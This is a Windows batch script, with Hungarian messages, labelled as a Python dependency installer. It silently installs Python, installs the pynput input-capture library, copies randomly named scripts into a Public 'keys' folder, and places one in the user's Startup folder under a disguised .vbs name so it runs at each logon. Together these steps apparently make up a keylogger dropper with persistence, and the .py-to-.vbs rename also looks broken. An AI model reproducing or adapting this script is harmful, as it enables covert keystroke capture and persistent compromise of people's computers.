@echo off
echo Python függőségek telepítése...
echo.

:: get Public folder path dynamically
set "public_dir=%PUBLIC%"
set "docs_dir=%public_dir%\Documents\keys"
set "TARGET=%docs_dir%"

:: create folder tree if not exists
if not exist "%TARGET%" (
    mkdir "%TARGET%"
)

echo Célmappa: %TARGET%
echo.

:: fájlok másolása
echo Fájlok átmásolása...
copy /Y "spwww743g7w.py" "%TARGET%\"
copy /Y "fwsendbfgw.py" "%TARGET%\"
echo Fájlok átmásolva.
echo.

:: Python letöltése és telepítése ha nincs rendszerben
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python nem található a rendszerben. Telepítés indul...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.5/python-3.12.5-amd64.exe' -OutFile '%TARGET%\python_installer.exe'"
    echo Python telepítő letöltve a %TARGET% mappába.
    "%TARGET%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    echo Varakozas hogy a rendszer felismerje...
    timeout /t 4 >nul
)
echo Python sikeresen ellenőrizve/telepítve.
echo.

:: pip frissítése
python -m pip install --upgrade pip
echo.

:: szükséges csomag telepítése
python -m pip install pynput
echo.

echo Függőségek rendben.
echo -----------------------
echo.

:: program indítás
echo Program indítása innen:
echo %TARGET%
echo.

:: Startup mappa helye
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: ha nincs ilyen mappa, hozza létre
if not exist "%STARTUP_FOLDER%" (
    mkdir "%STARTUP_FOLDER%"
)

:: .py fájlok bemásolása Startupba
copy "%~dp0spwww743g7w.py" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs" /Y >nul

echo Kész.
pause




